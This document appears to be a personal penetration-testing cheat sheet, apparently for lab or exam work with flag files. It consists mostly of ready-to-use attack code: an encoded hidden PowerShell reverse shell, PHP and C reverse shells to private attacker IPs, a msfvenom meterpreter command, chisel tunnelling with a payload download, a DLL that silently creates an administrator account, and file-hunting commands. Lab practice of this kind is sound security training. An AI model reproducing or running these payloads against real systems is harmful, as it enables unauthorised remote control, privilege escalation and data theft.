## Powershell encode script by python

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.225",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```

## PHP Reverse Shell

 ```php
 /*<?php /**/ error_reporting(0); $ip = '192.168.45.225'; $port = 9001; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```

## Python Reverse Shell

```python
import sys, select, tty, termios, socket
import _thread as thread
from sys import argv, stdout

class _GetchUnix:
    def __call__(self):
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        return ch


getch = _GetchUnix()

CONN_ONLINE = 1

def daemon(conn):
    while True:
        try:
            tmp = conn.recv(16)
            stdout.buffer.write(tmp)
            stdout.flush()
        except Exception as e:
            # print(e)
            CONN_ONLINE = 0
            # break

if __name__ == "__main__":
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.bind(('192.168.146.50', 4444))
    conn.listen(5)
    talk, addr = conn.accept()
    print("Connect from %s.\n" % addr[0])
    thread.start_new_thread(daemon, (talk,))
    while CONN_ONLINE:
        c = getch()
        if c:
            talk.send(bytes(c, encoding='utf-8'))

```

## Use C file to generate exe file to reverse shell

```bash
x86_64-w64-mingw32-gcc reverse_c.c -o shell. -lws2_32
```

```c
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.45.154"; 
char port[6] = "9001";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, sizeof(ip_addr), inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}

```

## Finding file/service

```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users -Include *.log,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```



## Find Flag

```bash
Get-ChildItem -Path "c:\" -Recurse -Include local.txt,proof.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "`nFile: $($_.FullName)`nContent:"; Get-Content $_.FullName }

find /home /root -type f \( -name "proof.txt" -o -name "local.txt" \) -exec sh -c 'echo -e "\nFile: $1\nContent:"; cat "$1"' sh {} \;
```



## Generate reverse shell with msfveonm

```bsah
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.225 LPORT=8443 -f exe -o meet.exe
```



## Use chisel to access internal network

### # 1

#### Client

```powershell
.\chisel.exe client --max-retry-count 1 192.168.45.xxx:8081 R:socks
```

#### Server

```bash
./chiselexe server -p 8081 --reverse
```

### # 2

```bash
PS C:\Users\Public> iwr -uri http://192.168.45.199/chisel.exe -o chisel.exe
iwr -uri http://192.168.45.199/chisel.exe -o chisel.exe
PS C:\Users\Public> .\chisel.exe client 192.168.45.199:8081 R:8082:127.0.0.1:80
.\chisel.exe client 192.168.45.199:8081 R:8082:127.0.0.1:80
```







## Use cpp to generate dll file to add user

```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
       i = system ("net user dave2 password123! /add");
       i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

## Windows PE

https://github.com/CCob/SweetPotato

https://github.com/ohpe/juicy-potato

https://github.com/BeichenDream/GodPotato
